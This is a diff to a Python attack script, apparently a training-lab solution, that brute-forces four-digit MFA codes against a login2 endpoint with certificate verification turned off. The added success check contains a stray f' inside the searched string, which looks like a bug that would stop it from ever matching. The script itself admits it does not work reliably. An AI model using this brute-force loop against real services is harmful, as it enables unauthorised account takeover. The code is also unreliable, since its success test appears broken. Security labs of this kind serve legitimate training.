@@ -26,15 +26,16 @@ def initiate_login(client, host):
 
 def try_mfa(client, host, csrf, i):
     msg = f'[ ] Try MFA-code {i:04d}'
-    print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg))}', end='\r', flush=True)
+    print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\r', flush=True)
     data = {'csrf': csrf, 'mfa-code': f'{i:04d}'}
     r = client.post(f'{host}/login2', data=data, allow_redirects=True)
-    if "Congratulations" in r.text:
+    if "f'Your username is: carlos" in r.text:
         return True
     return False
 
 
 def main():
+    print('[+] Lab: 2FA bypass using a brute-force attack')
     try:
         host = sys.argv[1].strip().rstrip('/')
     except IndexError:
@@ -42,7 +43,7 @@ def main():
         print(f'Exampe: {sys.argv[0]} http://www.example.com')
         sys.exit(-1)
 
-    print(f'[ ] Brute force 2FA')
+    print(f'[ ] Note: This script does not work reliably.')
 
     client = requests.Session()
     client.verify = False
